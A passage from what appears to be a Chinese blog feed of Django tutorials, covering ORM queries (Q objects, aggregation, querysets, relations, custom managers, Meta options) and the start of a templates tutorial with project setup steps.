<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(bread__gt=F(&#x27;bcomment&#x27;)*2)</span><br></pre></td></tr></table></figure>

<h2 id="Q-对象"><a href="#Q-对象" class="headerlink" title="Q 对象"></a>Q 对象</h2><p>多个过滤器逐个调用表示逻辑与关系，同 sql 语句中 where 部分的 and 关键字。</p>
<p>例：查询阅读量大于 20，并且编号小于 3 的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist=BookInfo.objects.filter(bread__gt=20,id__lt=3)</span><br><span class="line">或</span><br><span class="line">bklist=BookInfo.objects.filter(bread__gt=20).filter(id__lt=3)</span><br></pre></td></tr></table></figure>

<p>如果需要实现逻辑或 or 的查询，需要使用 Q()对象结合|运算符，Q 对象被义在 django.db.models 中。</p>
<p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Q(属性名__运算符=值)</span><br></pre></td></tr></table></figure>

<p>例：查询阅读量大于 20 的图书，改写为 Q 对象如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import Q</span><br><span class="line">...</span><br><span class="line">bklist = BookInfo.objects.filter(Q(bread__gt=20))</span><br></pre></td></tr></table></figure>

<p>Q 对象可以使用&amp;、|连接，&amp;表示逻辑与，|表示逻辑或。</p>
<p>例：查询阅读量大于 20，或编号小于 3 的图书，只能使用 Q 对象实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(Q(bread__gt=20) | Q(id__lt=3))</span><br></pre></td></tr></table></figure>

<p>Q 对象前可以使用~操作符，表示非 not。</p>
<p>例：查询编号不等于 3 的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(~Q(pk=3))</span><br></pre></td></tr></table></figure>

<h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><p>使用 <code>aggregate()</code> 过滤器调用聚合函数。聚合函数包括：Avg，Count，Max，Min，Sum，被定义在 django.db.models 中。</p>
<p>例：查询图书的总阅读量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import Sum</span><br><span class="line">...</span><br><span class="line">list = BookInfo.objects.aggregate(Sum(&#x27;bread&#x27;))</span><br></pre></td></tr></table></figure>

<p>注意 aggregate 的返回值是一个字典类型，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;聚合类小写__属性名&#x27;:值&#125;</span><br><span class="line">如:&#123;&#x27;sum__bread&#x27;:3&#125;</span><br></pre></td></tr></table></figure>

<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-24-21-40-23.png" class="">

<p>使用 count 时一般不使用 aggregate()过滤器。</p>
<p>例：查询图书总数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list = BookInfo.objects.count()</span><br></pre></td></tr></table></figure>

<p>注意 count 函数的返回值是一个数字。</p>
<h2 id="查询集"><a href="#查询集" class="headerlink" title="查询集"></a>查询集</h2><p>查询集表示从数据库中获取的对象集合，在管理器上调用某些过滤器方法会返回查询集，查询集可以含有零个、一个或多个过滤器。过滤器基于所给的参数限制查询的结果，从 Sql 的角度，查询集和 select 语句等价，过滤器像 where 和 limit 子句。</p>
<h3 id="返回查询集的过滤器如下："><a href="#返回查询集的过滤器如下：" class="headerlink" title="返回查询集的过滤器如下："></a>返回查询集的过滤器如下：</h3><ul>
<li><code>all()</code> ：返回所有数据。</li>
<li><code>filter()</code> ：返回满足条件的数据。</li>
<li><code>exclude()</code> ：返回满足条件之外的数据，相当于 sql 语句中 where 部分的 not 关键字。</li>
<li><code>order_by()</code> ：对结果进行排序。</li>
</ul>
<h3 id="返回单个值的过滤器如下："><a href="#返回单个值的过滤器如下：" class="headerlink" title="返回单个值的过滤器如下："></a>返回单个值的过滤器如下：</h3><ul>
<li><code>get()</code> ：返回单个满足条件的对象<ul>
<li>如果未找到会引发”模型类 .DoesNotExist “异常。</li>
<li>如果多条被返回，会引发”模型类 .MultipleObjectsReturned “异常。</li>
</ul>
</li>
<li><code>count()</code>：返回当前查询结果的总条数。</li>
<li><code>aggregate()</code>：聚合，返回一个字典。</li>
</ul>
<h3 id="判断某一个查询集中是否有数据："><a href="#判断某一个查询集中是否有数据：" class="headerlink" title="判断某一个查询集中是否有数据："></a>判断某一个查询集中是否有数据：</h3><ul>
<li><code>exists()</code>：判断查询集中是否有数据，如果有则返回 True ，没有则返回 False 。</li>
</ul>
<h3 id="两大特性"><a href="#两大特性" class="headerlink" title="两大特性"></a>两大特性</h3><ul>
<li>惰性执行：创建查询集不会访问数据库，直到调用数据时，才会访问数据库，调用数据的情况包括迭代、序列化、与 if 合用。</li>
<li>缓存：使用同一个查询集，第一次使用时会发生数据库的查询，然后把结果缓存下来，再次使用这个查询集时会使用缓存的数据。</li>
</ul>
<p><strong>查询集的缓存</strong></p>
<p>每个查询集都包含一个缓存来最小化对数据库的访问。</p>
<p>在新建的查询集中，缓存为空，首次对查询集求值时，会发生数据库查询，django 会将查询的结果存在查询集的缓存中，并返回请求的结果，接下来对查询集求值将重用缓存中的结果。</p>
<p>演示：运行项目 shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py shell</span><br></pre></td></tr></table></figure>

<p><strong>情况一</strong>：如下是两个查询集，无法重用缓存，每次查询都会与数据库进行一次交互，增加了数据库的负载。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import BookInfo</span><br><span class="line">[book.id for book in BookInfo.objects.all()]</span><br><span class="line">[book.id for book in BookInfo.objects.all()]</span><br></pre></td></tr></table></figure>

<p><strong>情况二</strong>：经过存储后，可以重用查询集，第二次使用缓存中的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list=BookInfo.objects.all()</span><br><span class="line">[book.id for book in list]</span><br><span class="line">[book.id for book in list]</span><br></pre></td></tr></table></figure>

<h3 id="限制查询集"><a href="#限制查询集" class="headerlink" title="限制查询集"></a>限制查询集</h3><p>可以对查询集进行取下标或切片操作，等同于 sql 中的 limit 和 offset 子句。</p>
<blockquote>
<p>注意：不支持负数索引。</p>
</blockquote>
<p>对查询集进行切片后返回一个新的查询集，不会立即执行查询。</p>
<p>如果获取一个对象，直接使用 [0] ，等同于 [0:1].get() ，但是如果没有数据，[0]引发 IndexError 异常， [0:1].get() 如果没有数据引发 DoesNotExist 异常。</p>
<p>示例：获取第 1、2 项，运行查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list=BookInfo.objects.all()[0:2]</span><br></pre></td></tr></table></figure>

<h1 id="模型关系"><a href="#模型关系" class="headerlink" title="模型关系"></a>模型关系</h1><h2 id="关系字段类型"><a href="#关系字段类型" class="headerlink" title="关系字段类型"></a>关系字段类型</h2><p>关系型数据库的关系包括三种类型：</p>
<ul>
<li>ForeignKey：一对多，将字段定义在多的一端中。</li>
<li>ManyToManyField：多对多，将字段定义在任意一端中。</li>
<li>OneToOneField：一对一，将字段定义在任意一端中。</li>
<li>可以维护递归的关联关系，使用’self’指定，详见”自关联”。</li>
</ul>
<h3 id="多对多关系"><a href="#多对多关系" class="headerlink" title="多对多关系"></a>多对多关系</h3><p>重新在项目 test2 下新建一个应用 newstest ,注册应用之后，编辑 <code>newstest/models.py</code> 文件设计模型类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"># Create your models here.</span><br><span class="line">class TypeInfo(models.Model):</span><br><span class="line">    tname = models.CharField(max_length=20) #新闻类型</span><br><span class="line"></span><br><span class="line">class NewsInfo(models.Model):</span><br><span class="line">    ntitle = models.CharField(max_length=60) # 新闻标题</span><br><span class="line">    ncontent = models.TextField() # 新闻内容</span><br><span class="line">    npub_date = models.DateTimeField(auto_now_add=True) #新闻发布时间</span><br><span class="line">    ntype = models.ManyToManyField(&#x27;TypeInfo&#x27;) #通过ManyToManyField建立TypeInfo类和NewsInfo类之间多对多的关系</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成迁移文件后，可以发现 newstest 多了一个 newstest_newsinfo_ntype 的中间表。</p>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-27-15-20-45.png" class="">

<h2 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h2><h3 id="过对象执行关联查询"><a href="#过对象执行关联查询" class="headerlink" title="过对象执行关联查询"></a>过对象执行关联查询</h3><p>在定义模型类时，可以指定三种关联关系，最常用的是一对多关系，如本例中的”图书-英雄”就为一对多关系，接下来进入 shell 练习关系的查询。</p>
<p>由一到多的访问语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一对应的模型类对象.多对应的模型类名小写_set</span><br><span class="line">例：</span><br><span class="line">b = BookInfo.objects.get(id=1)</span><br><span class="line">b.heroinfo_set.all()</span><br></pre></td></tr></table></figure>

<p>由多到一的访问语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多对应的模型类对象.多对应的模型类中的关系类属性名</span><br><span class="line">例：</span><br><span class="line">h = HeroInfo.objects.get(id=1)</span><br><span class="line">h.hbook</span><br></pre></td></tr></table></figure>

<p>访问一对应的模型类关联对象的 id 语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多对应的模型类对象.关联类属性_id</span><br><span class="line">例：</span><br><span class="line">h = HeroInfo.objects.get(id=1)</span><br><span class="line">h.hbook_id</span><br></pre></td></tr></table></figure>

<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-27-15-37-02.png" class="">

<h3 id="通过模型类执行关联查询"><a href="#通过模型类执行关联查询" class="headerlink" title="通过模型类执行关联查询"></a>通过模型类执行关联查询</h3><p>由多模型类条件查询一模型类数据:</p>
<p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关联模型类名小写__属性名__条件运算符=值</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果没有”__运算符”部分，表示等于，结果和 sql 中的 inner join 相同。</p>
</blockquote>
<p>例：查询图书，要求图书中英雄的描述包含’八’。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(heroinfo__hcomment__contains=&#x27;八&#x27;)</span><br></pre></td></tr></table></figure>

<p>由一模型类条件查询多模型类数据: 语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一模型类关联属性名__一模型类属性名__条件运算符=值</span><br></pre></td></tr></table></figure>

<p>例：查询书名为“天龙八部”的所有英雄。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hlist = HeroInfo.objects.filter(hbook__btitle=&quot;天龙八部&quot;)</span><br></pre></td></tr></table></figure>

<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-27-15-50-24.png" class="">

<h2 id="自关联"><a href="#自关联" class="headerlink" title="自关联"></a>自关联</h2><p>对于地区信息、分类信息等数据，表结构非常类似，每个表的数据量十分有限，为了充分利用数据表的大量数据存储功能，可以设计成一张表，内部的关系字段指向本表的主键，这就是自关联的表结构。</p>
<p>打开 booktest&#x2F;models.py 文件，定义 AreaInfo 类。</p>
<blockquote>
<p>说明：关系属性使用 self 指向本类，要求 null 和 blank 允许为空，因为一级数据是没有父级的。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#定义地区模型类，存储省、市、区县信息</span><br><span class="line">class AreaInfo(models.Model):</span><br><span class="line">    atitle=models.CharField(max_length=30)#名称</span><br><span class="line">    aParent=models.ForeignKey(&#x27;self&#x27;,null=True,blank=True)#关系</span><br></pre></td></tr></table></figure>

<p>迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>打开 mysql 命令行，导入数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source area.sql</span><br></pre></td></tr></table></figure>

<p>打开 booktest&#x2F;views.py 文件，定义视图 area。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import AreaInfo</span><br><span class="line">...</span><br><span class="line">#查询广州市的信息</span><br><span class="line">def area(request):</span><br><span class="line">    area = AreaInfo.objects.get(pk=440100)</span><br><span class="line">    return render(request, &#x27;booktest/area.html&#x27;, &#123;&#x27;area&#x27;: area&#125;)</span><br><span class="line"></span><br><span class="line">打开booktest/urls.py文件，新建一条url。</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    ...</span><br><span class="line">    url(r&#x27;^area/$&#x27;, views.area),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在 templates&#x2F;booktest 目录下，新建 area.html 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;地区&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">当前地区：&#123;&#123;area.atitle&#125;&#125;</span><br><span class="line">&lt;hr/&gt;</span><br><span class="line">上级地区：&#123;&#123;area.aParent.atitle&#125;&#125;</span><br><span class="line">&lt;hr/&gt;</span><br><span class="line">下级地区：</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;%for a in area.areainfo_set.all%&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123;a.atitle&#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;%endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>

<p>在浏览器中输出效果如下图。</p>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-27-16-06-03.png" class="">

<h2 id="模型实例方法"><a href="#模型实例方法" class="headerlink" title="模型实例方法"></a>模型实例方法</h2><ul>
<li>str()：在将对象转换成字符串时会被调用。</li>
<li>save()：将模型对象保存到数据表中，ORM 框架会转换成对应的 insert 或 update 语句。</li>
<li>delete()：将模型对象从数据表中删除，ORM 框架会转换成对应的 delete 语句。</li>
</ul>
<h2 id="模型类的属性"><a href="#模型类的属性" class="headerlink" title="模型类的属性"></a>模型类的属性</h2><p>属性 objects：管理器，是 models.Manager 类型的对象，用于与数据库进行交互。</p>
<blockquote>
<p>当没有为模型类定义管理器时，Django 会为每一个模型类生成一个名为 objects 的管理器，自定义管理器后，Django 不再生成默认管理器 objects。</p>
</blockquote>
<p>为模型类 BookInfo 定义管理器 books 语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class BookInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    books = models.Manager()</span><br></pre></td></tr></table></figure>

<h3 id="管理器-Manager"><a href="#管理器-Manager" class="headerlink" title="管理器 Manager"></a>管理器 Manager</h3><p>管理器是 Django 的模型进行数据库操作的接口，Django 应用的每个模型类都拥有至少一个管理器。Django 支持自定义管理器类，继承自 models.Manager。</p>
<p>自定义管理器类主要用于两种情况：</p>
<h4 id="1-修改原始查询集，重写-all-方法。"><a href="#1-修改原始查询集，重写-all-方法。" class="headerlink" title="1.修改原始查询集，重写 all()方法。"></a>1.修改原始查询集，重写 all()方法。</h4><p>a）打开 <code>booktest/models.py</code> 文件，定义类 BookInfoManager</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#图书管理器</span><br><span class="line">class BookInfoManager(models.Manager):</span><br><span class="line">    def all(self):</span><br><span class="line">        #默认查询未删除的图书信息</span><br><span class="line">        #调用父类的成员语法为：super().方法名</span><br><span class="line">        return super().all().filter(isDelete=False)</span><br></pre></td></tr></table></figure>

<p>b）在模型类 BookInfo 中定义管理器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class BookInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    books = BookInfoManager()</span><br></pre></td></tr></table></figure>

<h4 id="2-在管理器类中定义创建对象的方法"><a href="#2-在管理器类中定义创建对象的方法" class="headerlink" title="2.在管理器类中定义创建对象的方法"></a>2.在管理器类中定义创建对象的方法</h4><p>对模型类对应的数据表进行操作时，推荐将这些操作数据表的方法封装起来，放到模型管理器类中。</p>
<p>a）打开 <code>booktest/models.py</code> 文件，定义方法 create。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class BookInfoManager(models.Manager):</span><br><span class="line">    ...</span><br><span class="line">    #创建模型类，接收参数为属性赋值</span><br><span class="line">    def create_book(self, title, pub_date):</span><br><span class="line">        #创建模型类对象self.model可以获得模型类</span><br><span class="line">        book = self.model()</span><br><span class="line">        book.btitle = title</span><br><span class="line">        book.bpub_date = pub_date</span><br><span class="line">        book.bread=0</span><br><span class="line">        book.bcommet=0</span><br><span class="line">        book.isDelete = False</span><br><span class="line">        # 将数据插入进数据表</span><br><span class="line">        book.save()</span><br><span class="line">        return book</span><br></pre></td></tr></table></figure>

<p>b）为模型类 BookInfo 定义管理器 books 语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class BookInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    books = BookInfoManager()</span><br></pre></td></tr></table></figure>

<p>c）调用语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用：book=BookInfo.books.create_book(&quot;abc&quot;,date(1980,1,1))</span><br></pre></td></tr></table></figure>

<h2 id="元选项"><a href="#元选项" class="headerlink" title="元选项"></a>元选项</h2><p>在模型类中定义类 Meta，用于设置元信息，如使用 db_table 自定义表的名字。</p>
<p>数据表的默认名称为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;app_name&gt;_&lt;model_name&gt;</span><br></pre></td></tr></table></figure>

<p>例：<br>booktest_bookinfo</p>
<p>例：指定 BookInfo 模型类生成的数据表名为 bookinfo 。</p>
<p>在 BookInfo 模型类中添加如下内容，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#定义图书模型类BookInfo</span><br><span class="line">class BookInfo(models.Model):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    #定义元选项</span><br><span class="line">    class Meta:</span><br><span class="line">      db_table=&#x27;bookinfo&#x27; #指定BookInfo生成的数据表名为bookinfo</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-模板</title>
    <url>/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E6%A8%A1%E6%9D%BF">模板</a><ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E7%A4%BA%E4%BE%8B%E9%A1%B9%E7%9B%AE">创建示例项目</a></li>
</ul>
</li>
<li><a href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E8%A8%80">模板语言</a><ul>
<li><a href="#%E6%A8%A1%E6%9D%BF%E5%8F%98%E9%87%8F">模板变量</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E6%A0%87%E7%AD%BE">标签</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E8%BF%87%E6%BB%A4%E5%99%A8">过滤器</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8">自定义过滤器</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E9%87%8A">注释</a></li>
</ul>
</li>
<li><a href="#%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF">模板继承</a><ul>
<li><a href="#%E7%88%B6%E6%A8%A1%E6%9D%BF">父模板</a></li>
<li><a href="#%E5%AD%90%E6%A8%A1%E6%9D%BF">子模板</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#html-%E8%BD%AC%E4%B9%89">HTML 转义</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E9%97%AD%E8%BD%AC%E4%B9%89">关闭转义</a></li>
<li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E9%9D%A2%E5%80%BC">字符串字面值</a></li>
</ul>
</li>
<li><a href="#csrf">CSRF</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
<li><a href="#%E9%98%B2%E6%AD%A2-csrf">防止 CSRF</a></li>
<li><a href="#%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86">保护原理</a></li>
</ul>
</li>
<li><a href="#%E9%AA%8C%E8%AF%81%E7%A0%81">验证码</a><ul>
<li><a href="#%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0%E9%AA%8C%E8%AF%81%E7%A0%81">手动实现验证码</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81">调用验证码</a></li>
<li><a href="#%E9%AA%8C%E8%AF%81">验证</a></li>
</ul>
</li>
<li><a href="#%E5%8F%8D%E5%90%91%E8%A7%A3%E6%9E%90">反向解析</a><ul>
<li><a href="#%E7%A4%BA%E4%BE%8B">示例</a></li>
<li><a href="#url-%E7%9A%84%E5%8F%82%E6%95%B0">URL 的参数</a><ul>
<li><a href="#%E6%83%85%E5%86%B5%E4%B8%80%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0">情况一：位置参数</a></li>
<li><a href="#%E6%83%85%E5%86%B5%E4%BA%8C%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%82%E6%95%B0">情况二：关键字参数</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->

<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>作为 Web 框架，Django 提供了模板，用于编写 html 代码，还可以嵌入模板代码更快更方便的完成页面开发，再通过在视图中渲染模板，将生成最终的 html 字符串返回给客户端浏览器。模版致力于表达外观，而不是程序逻辑。模板的设计实现了业务逻辑 view 与显示内容 template 的分离，一个视图可以使用任意一个模板，一个模板可以供多个视图使用。</p>
<p>模板包含两部分：</p>
<ul>
<li>静态部分，包含 html、css、js 。</li>
<li>动态部分，就是模板语言。</li>
</ul>
<p>Django 模板语言，简写 DTL ，定义在 <code>django.template</code> 包中。 创建项目后，在 <code>项目名称/settings.py</code> 文件中定义了关于模板的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)],</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                &#x27;django.template.context_processors.debug&#x27;,</span><br><span class="line">                &#x27;django.template.context_processors.request&#x27;,</span><br><span class="line">                &#x27;django.contrib.auth.context_processors.auth&#x27;,</span><br><span class="line">                &#x27;django.contrib.messages.context_processors.messages&#x27;,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>DIRS 定义一个目录列表，模板引擎按列表顺序搜索这些目录以查找模板文件，通常是在项目的根目录下创建 templates 目录。</p>
<p>Django 处理模板分为两个阶段：</p>
<ol>
<li>加载：根据给定的路径找到模板文件，编译后放在内存中。</li>
<li>渲染：使用上下文数据对模板插值并返回生成的字符串。</li>
</ol>
<p>为了减少开发人员重复编写加载、渲染的代码，Django 提供了简写函数 render，用于调用模板。</p>
<h2 id="创建示例项目"><a href="#创建示例项目" class="headerlink" title="创建示例项目"></a>创建示例项目</h2><p>1）创建项目 test4 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject test4</span><br></pre></td></tr></table></figure>

<p>2）进入项目目录 test4 ，创建应用 booktest 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd test4</span><br><span class="line">python manage.py startapp booktest</span><br></pre></td></tr></table></figure>

<p>3）在 <code>test4/settings.py</code> 中 INSTALLED_APPS 项安装应用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;booktest&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>4）在 <code>test4/settings.py</code> 中 DATABASES 项配置使用 MySQL 数据库 test2 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        # &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line">        # &#x27;NAME&#x27;: os.path.join(BASE_DIR, &#x27;db.sqlite3&#x27;),</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: &#x27;test2&#x27;,</span><br><span class="line">        &#x27;HOST&#x27;: &#x27;localhost&#x27;,</span><br><span class="line">        &#x27;PORT&#x27;: &#x27;3306&#x27;,</span><br><span class="line">        &#x27;USER&#x27;: &#x27;ckcat&#x27;,</span><br><span class="line">        &#x27;PASSWORD&#x27;: &#x27;mysql&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>test4/__init__.py</code>中添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<p>5）在 <code>test4/settings.py</code>中 TEMPLATES 项配置模板查找路径，并创建模板文件夹 <code>templates</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)],</span><br></pre></td></tr></table></figure>

<p>6）打开 <code>test4/urls.py</code> 文件，包含 booktest 的 url 配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import include, url</span><br><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^admin/&#x27;, include(admin.site.urls)),</span><br><span class="line">    url(r&#x27;^&#x27;, include(&#x27;booktest.urls&#x27;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>7）创建 <code>booktest/urls.py</code> ，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from booktest import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^$&#x27;, views.index)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>8）打开 <code>booktest/views.py</code> 文件，定义视图 index。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">    return render(request,&#x27;booktest/index.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>9）在 <code>templates/booktest</code> 目录下创建文件 index.html，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>10）打开 <code>booktest/models.py</code> 文件，定义模型类 BookInfo 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line">class BookInfo(models.Model):</span><br><span class="line">    btitle = models.CharField(max_length=20, db_column=&#x27;title&#x27;)</span><br><span class="line">    bpub_date = models.DateField()</span><br><span class="line">    bread = models.IntegerField(default=0)</span><br><span class="line">    bcomment = models.IntegerField(default=0)</span><br><span class="line">    isDelete = models.BooleanField(default=False)</span><br></pre></td></tr></table></figure>

